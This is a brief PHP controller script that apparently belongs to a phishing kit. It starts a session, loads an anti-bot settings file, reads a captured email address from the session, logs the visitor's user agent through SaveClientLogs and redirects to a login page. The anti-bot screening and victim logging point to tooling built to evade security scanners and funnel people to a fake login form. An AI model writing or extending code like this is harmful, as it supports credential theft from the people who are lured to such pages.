<?php
session_start();
ob_start();
$Path = getcwd();
require_once $Path.'/Settings/Main_AntiBots.php';
$Email = $_SESSION['Maill'];
SaveClientLogs($_SESSION['UA']);
redirect_to(302,'login');
?>